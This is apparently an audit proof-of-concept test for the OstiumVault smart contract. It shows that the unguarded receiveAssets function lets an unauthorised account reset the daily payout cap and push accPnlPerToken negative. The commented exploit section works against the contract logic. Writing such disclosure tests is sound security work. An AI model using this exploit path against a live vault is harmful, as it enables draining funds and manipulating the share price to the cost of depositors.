import { expect } from 'chai';
import { ethers } from 'hardhat';


// `OstiumVault.receiveAssets` has no access control. It is the only function
// that decrements `dailyAccPnlDeltaPerToken`, the counter that gates the daily
// payout circuit breaker enforced in `sendAssets`. Any EOA can therefore push
// the counter back down at will and unblock a `sendAssets` that the protocol
// has explicitly refused.
//
// This test:
//   1. Funds the vault and drives `sendAssets` calls until the daily cap is
//      reached. The next `sendAssets` reverts with `MaxDailyPnlReached` —
//      the expected behaviour.
//   2. An unauthorised attacker calls `receiveAssets(...)`, transferring a
//      small amount of USDC in. This decrements `dailyAccPnlDeltaPerToken`
//      and `accPnlPerToken`, both critical solvency variables.
//   3. The previously-blocked `sendAssets` call now succeeds. The daily cap
//      has been silently bypassed by an account with no authorisation.
//
// As a side effect we also show that `accPnlPerToken` and `totalClosedPnl`
// can be moved into negative territory by the same permissionless path.

describe('OstiumVault.receiveAssets missing access control', () => {
  const PRECISION_18 = 10n ** 18n;

  it('attacker bypasses the daily PnL cap by calling receiveAssets', async () => {
    const [gov, lp, callbacks, attacker, trader] = await ethers.getSigners();

    const USDC = await ethers.getContractFactory('MockUSDC');
    const usdc = await USDC.deploy();

    const Registry = await ethers.getContractFactory('MockRegistry');
    const registry = await Registry.deploy(gov.address);

    const OpenPnl = await ethers.getContractFactory('MockOpenPnl');
    const openPnl = await OpenPnl.deploy();

    const b32 = ethers.encodeBytes32String;
    await registry.setContract(b32('callbacks'), callbacks.address);
    await registry.setContract(b32('openPnl'), await openPnl.getAddress());
    // lockedDepositNft is not exercised in this path but registered for safety
    await registry.setContract(b32('lockedDepositNft'), gov.address);

    // --- deploy vault behind an ERC1967 proxy ---
    const Vault = await ethers.getContractFactory('OstiumVault');
    const impl = await Vault.deploy();

    // Pick a small daily cap (1e16) so we can saturate it with a handful of
    // sendAssets calls inside the test. MIN_DAILY_ACC_PNL_DELTA is 1e13.
    const maxDailyAccPnlDeltaPerToken = 10n ** 16n;
    const initData = impl.interface.encodeFunctionData('initialize', [
      await usdc.getAddress(),
      await registry.getAddress(),
      10n ** 16n, // maxAccOpenPnlDeltaPerToken (unused in this path)
      maxDailyAccPnlDeltaPerToken,
      30000, // maxSupplyIncreaseDailyP = 300%
      0, // maxDiscountP = 0%
      15000, // maxDiscountThresholdP = 150%
      [100, 200], // withdrawLockThresholdsP
    ]);

    const Proxy = await ethers.getContractFactory('VaultProxy');
    const proxy = await Proxy.deploy(await impl.getAddress(), initData);
    const vault = Vault.attach(await proxy.getAddress()) as typeof impl;

    // --- LP funds the vault ---
    // 1000 USDC -> 1000e6 oLP at the initial 1:1 share price.
    const lpDeposit = 1_000n * 10n ** 6n;
    await usdc.mint(lp.address, lpDeposit);
    await usdc.connect(lp).approve(await vault.getAddress(), lpDeposit);
    await vault.connect(lp).deposit(lpDeposit, lp.address);

    expect(await vault.totalSupply()).to.equal(lpDeposit);
    expect(await vault.dailyAccPnlDeltaPerToken()).to.equal(0n);

    // --- saturate the daily cap via the legitimate callbacks path ---
    //
    // Per-call delta = ceil(assets * 1e18 / totalSupply)
    //                = ceil(1e6 * 1e18 / 1000e6) = 1e15.
    // 10 sends of 1 USDC -> dailyAccPnlDeltaPerToken = 1e16 (== cap).
    // The 11th send would exceed the cap and is correctly refused.
    const payout = 1_000_000n; // 1 USDC
    const perCallDelta = (payout * PRECISION_18) / lpDeposit;
    for (let i = 0; i < 10; i++) {
      await vault.connect(callbacks).sendAssets(payout, trader.address);
    }
    expect(await vault.dailyAccPnlDeltaPerToken()).to.equal(
      maxDailyAccPnlDeltaPerToken
    );

    await expect(
      vault.connect(callbacks).sendAssets(payout, trader.address)
    ).to.be.revertedWithCustomError(vault, 'MaxDailyPnlReached');

    // ============================================================
    //                       EXPLOIT
    // ============================================================
    //
    // The "attacker" signer is not callbacks, not gov, and has zero shares.
    // They simply call receiveAssets with their own USDC. The function is
    // unguarded, so the call is accepted and decrements both
    // `dailyAccPnlDeltaPerToken` and `accPnlPerToken` for free.
    const dump = 5n * payout; // 5 USDC -> delta = 5e15
    await usdc.mint(attacker.address, dump);
    await usdc.connect(attacker).approve(await vault.getAddress(), dump);

    const dailyBefore = await vault.dailyAccPnlDeltaPerToken();
    const accBefore = await vault.accPnlPerToken();
    const closedBefore = await vault.totalClosedPnl();

    await vault.connect(attacker).receiveAssets(dump, attacker.address);

    const dumpDelta = (dump * PRECISION_18) / lpDeposit;
    expect(await vault.dailyAccPnlDeltaPerToken()).to.equal(
      dailyBefore - dumpDelta
    );
    expect(await vault.accPnlPerToken()).to.equal(accBefore - dumpDelta);
    expect(await vault.totalClosedPnl()).to.equal(closedBefore - dump);

    // The previously-blocked payout now goes through, even though the
    // protocol's daily-cap rule says it should not have, because the
    // attacker silently moved the counter back below the threshold.
    await expect(
      vault.connect(callbacks).sendAssets(payout, trader.address)
    ).to.not.be.reverted;

    // Counter is now dump-adjusted + 1 extra payout above the original cap.
    expect(await vault.dailyAccPnlDeltaPerToken()).to.equal(
      maxDailyAccPnlDeltaPerToken - dumpDelta + perCallDelta
    );

    // accPnlPerToken can keep being driven arbitrarily downward by the same
    // primitive — there is no lower bound. Stack a few more attacker calls
    // and watch it go far negative, which (at the next epoch transition)
    // will inflate `accPnlPerTokenUsed` -> `shareToAssetsPrice` and let new
    // depositors mint at a manipulated price.
    for (let i = 0; i < 5; i++) {
      const more = 10n * payout;
      await usdc.mint(attacker.address, more);
      await usdc.connect(attacker).approve(await vault.getAddress(), more);
      await vault.connect(attacker).receiveAssets(more, attacker.address);
    }
    expect(await vault.accPnlPerToken()).to.be.lessThan(0n);
    expect(await vault.totalClosedPnl()).to.be.lessThan(0n);
  });
});
